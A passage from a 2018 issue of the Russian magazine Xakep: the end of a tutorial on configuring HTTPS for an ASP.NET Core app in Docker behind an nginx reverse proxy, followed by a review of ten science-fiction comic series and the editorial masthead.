перейдя на незащищенный протокол HTTP, например, понизить версию TLS
или даже подменить сертификат. Как правило, данный вид атак используется
совместно с атаками man in the middle.
  Следует помнить, что HSTS не поможет, если пользователь заходит
на сайт по протоколу HTTP и потом редиректится на HTTPS. Существует так
называемый Chrome preload  list, который содержит ссылки на сайты, под-
держивающие HTTPS. Другие браузеры (Firefox, Opera, Safari, Edge) также
поддерживают списки HTTPS-сайтов, созданные на базе списка Chrome.
Но во всех этих списках содержатся далеко не все сайты.
  При первом  запуске  какого-либо  Core-приложения  на Windows  ты
получишь сообщение о том, что был создан и установлен сертификат раз-
работчика. Кликнув кнопку и установив сертификат, ты таким образом сде-
лаешь его доверенным. Из командной строки на macOS добавить доверие
сертификату можно с помощью


> dotnet dev-certs https -trust

Если утилита dev-certs не установлена, то установить ее можно командой


> dotnet tool install --global dotnet-dev-certs

Как добавить сертификат в trusted на Linux, зависит от дистрибутива. В тес-
товых целях используем именно сертификат разработчика. Действия с сер-
тификатом, подписанным CA, аналогичны. При желании можно восполь-
зоваться и бесплатными сертификатами Let’s Encrypt.
  Экспортировать сертификат разработчика в файл можно с помощью
команды


> dotnet dev-certs https -ep путь_к_создаваемому_файлу.pfx

Файл  следует  скопировать  в  директорию  %APPDATA%/ASP.NET/Https/
под Windows или же в /root/.aspnet/https/ под macOS/Linux. Для того что-
бы контейнер подцепил путь к сертификату и его пароль, необходимо создать
User secrets со следующим содержимым:


{
    "Kestrel":{
        "Certificates":{
            "Default":{
                "Path":     "/root/.aspnet/https/имя_твоего_сертификата.pfx",
                "Password": "пароль_от_твоего_сертификата"
            }
        }
    }
}

Этот файл хранит незашифрованные данные и потому используется только
при разработке. Создается файл в Visual Studio через вызов контекстного
меню на иконке проекта или с помощью утилиты user-secrets на Linux.
  На Windows файл будет сохранен в директории %APPDATA%\Microsoft\
UserSecrets\<user_secrets_id>\secrets.json, а на macOS и Linux он сох-
ранится в ~/.microsoft/usersecrets/<user_secrets_id>/secrets.json.
  Для сохранения настроек на продакшене некоторые дистрибутивы Linux
могут использовать systemd. Настройки сохраняются под атрибутом Service.
Например, так:


[Service]
Environment="Kestrel _ Certificates _ Default _Path=/root/.aspnet/https/
имя_твоего_сертификата.pfx"
Environment="Kestrel _ Certificates _ Default _Passw
ord=пароль_от_твоего_сертификата"

Далее приведу и разберу сразу рабочий вариант конфигурации «Докера»
для прокси и контейнера через HTTPS.
  Файл docker-compose:


version: '3.4'
services:
  dockerservicedemo21:
    image: ${DOCKER_REGISTRY}dockerservicedemo
    build:
      context: .
      dockerfile: DockerServiceDemo/Dockerfile
Файл override:
version: '3.4'
services:
  dockerservicedemo:
    environment:
      - ASPNETCORE_ENVIRONMENT=Development
      - ASPNETCORE_URLS=https://+:44392;http://+:80
      - ASPNETCORE_HTTPS_PORT=44392
    ports:
      - "59404:80"
      - "44392:44392"
    volumes:
      - ${APPDATA}/ASP.NET/Https:/root/.aspnet/https:ro
      - ${APPDATA}/Microsoft/UserSecrets:/root/.microsoft/usersecrets:ro
  proxy:
    image: nginx:latest
    volumes:
      - ./DockerServiceDemo/nginx.conf:/etc/nginx/nginx.conf
      - ./DockerServiceDemo/cert.crt:/etc/nginx/cert.crt
      - ./DockerServiceDemo/cert.rsa:/etc/nginx/cert.rsa
    ports:
      - "5001:44392"

Теперь опишу непонятные моменты. ASPNETCORE_URLS позволяет нам
не указывать в коде приложения с помощью app.UseUrl прослушиваемый при-
ложением порт. ASPNETCORE_HTTPS_PORT делает редирект, аналогичный
тому, какой бы сделал следующий код:


services.AddHttpsRedirection(options => options.HttpsPort = 44392)

То есть трафик с HTTP-запросов будет перенаправлен на определенный порт
HTTPS-запросов.
  С помощью ports указывается, что запрос с внешнего 59404-го порта
будет перенаправлен на 80-й контейнера, а с 44392-го внешнего порта
на 44392-й. Теоретически, раз у нас будет настроен обратный прокси-сер-
вер, ports с этими перенаправлениями мы можем и убрать. С помощью
volumes монтируется директория с pfx-сертификатом и UserSecrets приложе-
ния с указанием пароля и ссылки на сертификат. В разделе proxy указыва-
ется,  что запросы с 5001-го внешнего порта  будут перенаправляться
на 44392-й порт nginx. Кроме того, монтируется файл с конфигурацией nginx,
а также сертификат и ключ к сертификату.
   Чтобы из одного сертификата формата pfx (который у нас уже есть) соз-
дать файлы crt и rsa, можно воспользоваться OpenSSL. Сначала необходимо
извлечь сертификат:


$ openssl pkcs12 -in ./твой_сертификат.pfx -clcerts -nokeys -out domain.crt

А затем приватный ключ:


$ openssl pkcs12 -in ./твой_сертификат.pfx -nocerts -nodes -out domain.rsa

Конфигурация nginx следующая:


worker_processes 4;
events { worker_connections 1024; }
http {
    sendfile on;
    upstream app_servers {
        server dockerservicedemo:44392;
    }
    server {
    listen 44392 ssl;
    ssl_certificate /etc/nginx/cert.crt;
    ssl_certificate_key /etc/nginx/cert.rsa;
    location / {
        proxy_pass         https://app_servers;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection keep-alive;
        proxy_set_header   Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto $scheme;
      }
    }
}

Прокси-сервер прослушивает 44392-й порт. На этот порт приходят запросы
с 5001-го порта хоста. Далее прокси перенаправляет запросы на 44392-й
порт контейнера dockerservicedemo.
  Разобравшись с данными примерами, ты получишь хороший бэкграунд
для работы с «Докером», микросервисами и nginx.
GEEK





               Андрей Письменный
                    Шеф‐редактор
                   apismenny@gmail.com

10  НАУЧНО-ФАНТАСТИЧЕСКИХ
КОМИКСОВ
       ДЛЯ ТЕХ, КТО НЕ ЧИТАЕТ КОМИКСЫ
            И НЕ ЛЮБИТ СУПЕРГЕРОЕВ





В то время как фильмы по комиксам бьют все воз можные
рекорды кассовых сборов, сами комиксы остаются для мно‐
гих неизвестной культурой, к которой сложно подступиться.
Бесконечные серии про супергероев,  где не отыскать
ни начала, ни конца, только укрепляют эту репутацию. Мы
подобрали десяток комиксовых сериалов, которые пред‐
назначены для взрослой аудитории, не содержат людей
в цветных трико, имеют структуру законченного произве‐
дения и могут хотя бы отда ленно считаться научной фан‐
тастикой.


             INFO

                    По ссылкам ниже ты можешь найти наши под‐
                      борки хакерских фильмов и фантастических книг:
                     •17 лучших хакер ских фильмов всех времен (и
                        четыре отличных сериала)
                     •15 серьезных фильмов о хакерской культуре
                       и изнанке индустрии
                     •13 книг и расска зов, которые ты должен про‐
                           честь до технологической сингулярности


Я постарался опустить совсем уж очевидные рекомендации прочитать «Хра‐
нителей» (The Watchmen) и V for Vendetta — с нетленкой Алана Мура ты уже
наверняка сталкивался. Одна ко без классики не обойтись никак, поэтому
начнем со старых и про веренных временем рекомендаций, а потом пос‐
тепенно перейдем к более новому и экспериментальному.


TRANSMETROPOLITAN
Наверняка где‐нибудь на прос торах интернета тебе уже попадалось изоб‐
ражение лысого мужчины в странных красно‐зеленых очках и с татуировкой
паука на голове. Обычно он сжимает в зубах сигарету и смотрит на нас
с дьявольским прищуром. Так вот, зовут этого товарища Спайдер Иеру салим,
и он работает журналис том в городе будущего, который в комиксе называ‐
ется просто Город.
  При том что Transmetropolitan далеко не нов (первый выпуск датиру‐
ется 1997 годом, последний — 2002‐м), он нис колько не утратил актуальнос‐
ти — ни в плане обсужда емых проблем, ни даже в пла не технологий.
  Например, на первых же страницах нам попадается разумный 3D‐принтер,
который откуда‐то скачал себе цифровых наркотиков и, немного заглючив,
напечатал для Спайдера знаменитые очки. Тот, кстати, и сам не чужд вещес‐
твам — иначе какой из него последователь Хантера Томпсона?
  И пусть яркие краски не собьют тебя с толку: Город — это самая нас‐
тоящая антиутопия. По помойкам шастают трехглазые кошки‐мутанты, неоно‐
вые витрины рекламиру ют сексуальные утехи с участием кукол из «Мап‐
пет‐шоу», беспризорные дети грызут выращенные  in  vitro человеческие
конечности, и так далее, и тому подобное.
  Пристроившись на крыше стрип‐клуба, Спайдер сражается за последние
крохи правды, справедливости и человеческого дос тоинства: строчит колон‐
ку, где, не стесняясь в выражениях, выводит на чис тую воду коррумпирован‐
ных политиков. В общем, что тут может не понравиться?





THE INVISIBLES
Советовать The Invisibles даже немного странно — это знаменитое произве‐
дение, которое оставило в истории комиксов след, сравнимый с «Храните‐
лями». Пересказывать сюжет  тоже  бессмыс ленно:  кис лотные  видения
и отсылки к поп‐культуре, равно как и приключения команды крайне неор‐
динарных личностей, которые ведут войну за сво боду человеческого соз‐
нания с загадочной Внешней Церковью, — все это гораз до лучше изучать
в первоисточнике.
  Ты можешь спросить, что в нашем списке делает мистика. The Invisibles
здесь скорее из‐за тематики бунта и контркуль туры. Впрочем, этот комикс
вполне можно считать фантастикой — прос то в широком смыс ле и без пря‐
мых связей с технологиями.
  Признаюсь: я, начав уже не один раз, так и не дочитал «Невидимок»
до конца. Характерно, что каждый раз при чтении уда ется най ти что‐то новое,
но процесс идет не быстро и не легко. В общем, запасайся терпением — In‐
visibles того, безусловно, стоят.





Y: THE LAST MAN
И снова современная классика.  Y: The  Last Man начал публиковаться
в 2002 году, а закончился в 2008‐м. На страницах этого комикса тебя ждет
история о том, как вирус уничтожил всех мужчин и животных‐самцов на земле,
кроме главного героя Йорика и его ручной обезьянки Амперсанда.
   Йорик, вместо того чтобы стать основным источником генетического
материала, тщательно мас кируется и пересекает Америку, чтобы докопаться
до причин заражения, найти свою воз любленную и (куда же без этого) спасти
человечество.
  Диалоги то и дело ненавяз чиво сворачи вают на обсужде ние полового
неравенства и гендерных стереотипов, но Y: The Last Man вряд ли утомит тебя
моралью. Приключения со стрельбой, драками и легкомысленны ми переоде‐
ваниями, постапокалипсис в качестве живопис ного фона, ненавяз чивый
юмор, яркие персонажи и в целом крайне жиз неутверждающий нас трой
помогают проглотить все 60 выпусков за нес коль ко дней. Так что заранее
выдели под это выходные или часть отпуска, а не то можешь слу чайно
выпасть из жизни.





TOKYO GHOST
Если ты просматриваешь этот список в поисках настоящего темного и мелан‐
холичного киберпанка, то вот он. В Tokyo Ghost изображен мир далекого
будущего, которое подоз ритель но похоже на гро тес кный вариант настояще‐
го: большинство людей ведет овощ ной образ жизни, намертво подсев
на непрерывную подачу цифровых раз влечений.
   Героиня, вооружив шись катаной и мощ ной ненавистью к происходяще му,
воюет со слетевшим с катушек искусс твенным интеллектом, чтобы спасти
своего бойфренда. Правда, научной фантасти кой все это можно назвать
только с большой натяжкой, которая подчас растягивается совсем уж тон‐
ко — особенно когда в дело вступает завезенный героями из Японии древ‐
ний дух земли.
   Главное достоинство Tokyo Ghost — в том, как все красиво: и нарисовано,
и придумано. К тому же продирать ся через десят ки выпус ков и следить
за ветвлением сюжетных арок тебе не при дется: речь всего о десяти тонких
книжицах, которые выходили с 2015 по 2016 годы. Чтобы нас ладиться уни‐
кальным стилем и глянуть на очередной темный и безыс ходный мир — более
чем достаточно.





BLACK SCIENCE
Если бывает тем ная магия, то почему не быть темной науке? Грант Маккей,
главный герой этой пока что не оконченной саги, изобрел, с одной стороны,
чудесное, с другой — пуга ющее устройство. Оно поз воляет ему и его коман‐
де путешествовать по бесконечному множес тву параллельных вселенных.
И конечно же, все идет не по плану уже на самых первых страницах.
  Сюжет Black Science закручен нас только лихо, а миры, по которым скачут
герои, настолько яркие, что голова может пойти кругом — особенно если
читать нон‐стоп (а соб лазн сделать именно так велик). Сюда же добавь глу‐
бокий психологизм бесконечных отражений одной и той же истории любви,
предательства и поломанных семейных отношений. А вот науки здесь снова
минимум — вопреки названию.
   Если успешно проглотишь Tokyo Ghost и подсядешь на Black Science,
не забудь глянуть и другие комиксы их авто ра Рика Ремендера. В первую оче‐
редь рекомендую Deadly Class — историю о слож ностях жизни учеников шко‐
лы убийц. Это что‐то вроде Гарри Пот тера, но со строжайшим возрастным
рейтингом и уклоном в изу чение молодежных суб культур восьмидесятых —
девяностых.





THE PRIVATE EYE
Однажды вся информация, которую люди сохраняли в «облаках», взяла и про‐
лилась обильным дождем: защиты рухнули и всё ста ло в одночасье доступно
всем. С тех пор человечество больше не доверяло компьютерам и значитель‐
но сильнее озаботилось приватностью — нас толь ко, что на улице не встре‐
тишь человека без маски на лице.
   The Private Eye — исто рия частного детектива, который оказывается в цен‐
тре запутанной истории и ловко ее распутывает. Но в данном случае важен
не столько сюжет, сколько попытка авто ра вооб разить, каким будет похмелье
после массового опьянения, в котором мы выбрасываем в Сеть мас су личных
данных.
  Наверняка мир Private Eye покажется тебе несколько карикатурным, но для
комиксов это вполне нормально. Осо бенно, конечно, забавно видеть собс‐
твенное кривое отражение: отец главного героя — состарившийся геймер
и любитель гаджетов, дитя начала двухтысячных. Он, страдая старческим
маразмом, тычет в экран телефона и не может понять, куда подевал ся
интернет.
  К этим плодам вооб ражения Брайана Вона можно относиться скептичес‐
ки, но ознакомиться все же стоит, тем более что комикс распространяется
по модели «заплати сколь ко захочешь, можешь не платить вовсе» и доступен
в виде PDF.





SAGA
Если ты ищешь что‐нибудь легкое и приятное для чтения по вечерам, но тем
не менее настолько захватывающее, чтобы хотелось воз вращаться снова
и снова, то сложно дать лучшую рекомендацию, чем Saga. Это кос мическое
фэнтези масштаба «Звездных войн», в центре которого — классичес кая исто‐
рия запретной любви между представителями двух враждующих фракций.
  Пересказывать сюжет «Саги» не буду, ведь ценен вовсе не он. Здесь
привлекает скорее буйство воображения, невероятные масштабы и разнооб‐
разие красочных миров и населяющих их рас. Любоваться всем этим особен‐
но приятно, поскольку и нарисо вана «Сага» под стать. От кру тиз ны иного раз‐
ворота просто дух захватывает.
  Начав читать «Сагу» с первых выпусков, я не заметил, как их число по про‐
шествии шести лет перевалило за полсотни. В истории этого комикса было
уже столько все го, а она, похоже, только набира ет обороты.





THE MANHATTAN PROJECTS
Пожалуй, картинки, на которой Альберт Эйнштейн распиливает инопланетя‐
нина бензопилой, впол не дос таточно, чтобы охарактеризовать этот комикс.
Если такой образ вызывает у тебя отторжение, спокойно проходи мимо
и упражняйся в снобизме где‐нибудь еще.





А вот если картинка кажется интересной, то тебя ждет много часов занима‐
тельного чтива. Книжка за книжкой перед тобой будет разворачиваться аль‐
тернативный мир, в котором ученые, при ложившие руку к созданию аме‐
риканской ядерной бомбы, творят совершенно неописуемые вещи.
  Иллюминаты, инопланетные нашествия, тай ные сделки с СССР — в котле
воображения создателей Manhattan  Projects переварились самые дикие
теории заговора. Получившееся месиво акку рат но разложено по панелям
и приправлено черным юмо ром. Это, быть может, и не самое полез ное
из интеллектуальных блюд, но вышло на удивление удобоваримо.
  До последней книги (The Sun Beyond the Stars), пос вященной космичес ким
приключениям Юрия Гагарина и Лайки, я пока не добрался, но с предвку‐
шением жду этого момента.





DOKTOR SLEEPLESS
«Где мой чертов ракетный ранец?», «Где наши летающие автомобили?» —
задаются вопросами герои комикса Doktor Sleepless. Они имеют в виду, что
будущее, которое им (и нам) обещали в старой научной фантасти ке, так и не
наступило. Вместо него они (как и мы!) теперь имеют совсем другие тех‐
нологии.
  Действие Doktor Sleepless происходит как бы в тупике истории, вырваться
из которого и пытаются его персонажи. Главный из них — самопровозгла‐
шенный безумный ученый. Его безумие проявля ется в основном в виде
напыщенных речей, которые он веща ет при помощи пиратской ради‐
останции. Его аудитория — представители радикальных субкультур вроде
гриндеров (любители вживлять в себя электронные импланты) и девушек
шрайки, которые удален но синхронизируют свои ощущения.
  К сожалению, Doktor Sleepless, ударно начавшись в 2007 году, так никогда
и не будет окончен или хотя бы продолжен. Бро шенная в последнем (шес‐
тнадцатом) выпуске граната с наклейкой в виде улыбающегося лица так
и останется висеть в воздухе, а прилагавшаяся к комиксу вики уже даже
не открывается.
  Однако если тебе нравят ся работы Уоррена Эллиса, то уже законченные
сериалы вроде Planetary и FreakAngels подарят тебе много часов удоволь‐
ствия. Также рекомендую Ignition City — неболь шую историю о полузаб‐
рошенном космогородке и серию Injection, которая сейчас только начинается
и позаимствовала из Doktor Sleepless кое‐какие идеи.





PAPER GIRLS
Второй сезон «Очень странных дел» закончился, а ты хочешь чего‐нибудь
еще в том же духе? Читай Paper Girls — это во многом даже круче. Четыре
героини этого комик са, начав путешес твовать во времени, никак не могут
прекратить и вернуться домой в вось мидесятые. Вместо этого им приходится
сталкиваться со все новыми и новыми загадками, разгадками и удивитель‐
ными приключениями.
  По дороге автору уда ется интересно пораз мышлять о тех изменениях,
которые произошли в нашей жизни и в обществе за последние пару‐тройку
десятков лет. Добавь к это му незабываемый визуальный стиль (чего стоят
одни только обложки!), и ты поймешь, почему этот комикс стал стремительно
набирать популярность.
  Всего пока что доступно 23 выпус ка — отличный момент, чтобы прочесть
их все в пару приемов и ждать следующих.





НЕБОЛЬШОЕ НАПУТСТВИЕ
Внимательный читатель наверняка заметит, что я немного схитрил и полови на
списка — это одни и те же три автора: Уоррен Эллис, Брайан Вон и Рик
Ремендер. Но ничего не могу с собой поделать — именно с них я начал зна‐
комство с современными комиксами, не был разочарован и предвку шаю
новые творения. Надеюсь, тебя ждет не менее при ятный экспириенс.
  В качестве допол нительных ориентиров могу порекомендовать смотреть
на издательство и импринт, под которым выпускаются книжки. Сейчас очень
много хороше го выходит в Image Comics, а раньше для той же аудитории
предназначались импринты Vertigo и Wildstorm, принадлежащие DC.
  В общем, успешных поис ков и приятного чтения!
   №08 (233)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Главный редактор       Выпускающий редактор         Шеф‐редактор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Евгений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018